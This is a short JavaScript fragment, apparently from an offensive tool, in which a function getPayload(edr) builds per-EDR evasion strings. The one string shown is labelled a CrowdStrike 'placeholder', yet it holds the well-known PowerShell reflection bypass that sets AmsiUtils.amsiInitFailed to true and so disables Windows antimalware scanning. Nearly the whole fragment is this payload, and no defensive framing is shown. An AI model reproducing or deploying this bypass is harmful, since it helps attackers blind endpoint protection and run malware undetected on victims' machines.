...
function getPayload(edr) {
    ...
    const crowdStrikePayload = `#CrowdStrike AMSI Bypass (Placeholder) \n$${memvar}="System.Management.Automation.AmsiUtils";[Ref].Assembly.GetType($${memvar}).GetField('amsiInitFailed',"NonPublic,Static").SetValue($null,$true); #Simplified for demo`;
